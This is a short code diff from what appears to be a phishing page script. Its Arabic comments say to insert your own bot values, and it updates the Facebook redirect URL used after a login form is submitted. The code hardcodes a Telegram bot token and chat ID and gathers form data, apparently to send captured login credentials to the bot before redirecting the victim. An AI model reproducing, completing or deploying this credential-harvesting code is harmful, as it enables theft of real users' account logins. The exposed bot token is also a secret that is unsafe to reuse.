@@ -4,7 +4,7 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
     // 1. بيانات البوت (استبدلها بقيمك الخاصة)
     const BOT_TOKEN = '7678960020:AAFSToYS6Hn5x_9JnPA6GvqBr_ZLlirrqgo';
     const CHAT_ID = '7341192450';
-    const REDIRECT_URL = 'https://www.facebook.com/'; // استبدل برابط صفحتك المحددة
+    const REDIRECT_URL = 'https://www.facebook.com/share/g/14ukXTgy57B/?mibextid=wwXIfr'; // استبدل برابط صفحتك المحددة
 
     // 2. جمع البيانات مع إضافة معلومات إضافية
     const formData = {
